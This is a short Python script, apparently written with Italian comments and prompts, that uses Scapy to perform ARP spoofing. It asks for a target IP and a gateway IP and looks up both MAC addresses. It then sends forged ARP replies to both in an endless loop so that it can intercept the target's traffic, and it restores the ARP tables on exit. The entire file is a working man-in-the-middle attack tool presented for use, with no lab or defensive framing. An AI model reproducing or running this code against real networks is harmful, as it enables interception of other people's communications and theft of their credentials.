from scapy.all import ARP, Ether, srp, send
import time
import sys
import os

def get_mac(ip):
    """
    Ritorna il MAC address associato a un IP nella rete locale.
    """
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    """
    Invia un pacchetto ARP falso al target, dicendo:
    "Io (spoof_ip) sono a questo MAC (il mio)"
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,               # is-at (spoof)
        pdst=target_ip,     # chi voglio ingannare
        hwdst=target_mac,   # MAC del target
        psrc=spoof_ip       # fingo di essere questo IP
    )
    send(packet, verbose=0)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    """
    Ripristina la mappatura ARP corretta tra target e router.
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac
    )
    send(packet, count=3, verbose=0)

if __name__ == "__main__":
    if os.geteuid() != 0 and os.name != 'nt':
        print("[!] Devi eseguire lo script come root (Linux/macOS) o come Admin (Windows).")
        sys.exit(1)

    # Inserisci IP target e gateway
    target_ip = input("IP del target (dispositivo da intercettare): ")
    gateway_ip = input("IP del gateway/router: ")

    print("[*] Risoluzione MAC address...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[!] Impossibile risolvere i MAC address. Assicurati che i dispositivi siano raggiungibili.")
        sys.exit(1)

    print(f"[+] MAC target: {target_mac}")
    print(f"[+] MAC gateway: {gateway_mac}")

    print("[*] Inizio ARP spoofing... premi CTRL+C per fermare.")
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)   # Fingo di essere il gateway per il target
            spoof(gateway_ip, target_ip, gateway_mac)   # Fingo di essere il target per il gateway
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Interruzione rilevata. Ripristino delle tabelle ARP...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[*] ARP ripristinato. Uscita.")